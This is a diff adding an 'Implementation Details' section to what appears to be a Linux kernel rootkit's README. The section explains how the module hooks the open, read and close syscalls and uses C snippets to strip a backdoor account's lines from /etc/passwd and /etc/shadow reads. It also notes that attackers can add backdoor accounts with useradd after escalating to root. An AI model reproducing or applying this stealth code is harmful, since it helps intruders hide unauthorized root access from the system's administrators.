@@ -261,6 +261,39 @@ Dropping the escalated process back to its original UID
 > **PLEASE NOTE: at most, 1 account can be hidden at a time**
 The rootkit hides a backdoor account by hijacking the read syscall and truncating parts of the output buffer.
 
+### Implementation Details
+The module hijacks the system calls open, read, and close. The idea is that when a normal file is opened, all three syscalls will return their regular outputs. However, when files such as /etc/passwd and /etc/shadow are being opened, a flag called "erase" is triggered for read syscall to do specific hiding. 
+
+The flag erase is an enum with the following definition.
+
+    enum file_content_hide {NONE, PASS_E, SHAD_E} file_content_hide;
+
+A switch statement is used to determine the content to hide (stored in string variable hidden).
+
+    switch(erase){
+        case PASS_E:
+            hidden = fugitive__lines[0];
+            break;
+        case SHAD_E:
+            hidden = fugitive__lines[1];
+            break;
+        case NONE:
+            // Do nothing as it is a regular file
+            break;
+    }
+
+We then proceed to null out the part of the content we want to hide, and substract hidden from return size.
+
+    if(hidden != NULL){
+        ptr = strnstr(buf, hidden, count);
+        if(ptr != NULL) {
+            memset(ptr, '\0', strlen(hidden));
+            ret -= count < strlen(hidden) ? count : strlen(hidden);
+        }
+    }
+
+> **Note** We decide to take out the function that adds a backdoor account, as we can add a backdoor account by elevating to root privilege and add the account dynamically using useradd, instead of adding a fixed backdoor account. 
+
 ### Hiding an Account
 Pass 1 line from "/etc/passwd" along with another from "/etc/shadow" into the driver:
 
